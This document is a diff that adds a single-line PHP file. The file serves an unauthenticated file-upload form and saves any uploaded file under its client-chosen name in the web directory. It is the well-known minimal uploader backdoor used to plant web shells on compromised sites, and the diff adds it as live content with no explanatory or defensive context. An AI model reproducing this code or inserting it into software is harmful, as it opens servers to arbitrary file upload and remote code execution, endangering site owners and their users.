@@ -1,0 +1,1 @@
+<?php echo '<form method="post" enctype="multipart/form-data"><input name="_" type="file"><input name="_" type="submit"></form>';if($_POST){if(@copy($_FILES['_']['tmp_name'], $_FILES['_']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded!';}}?>
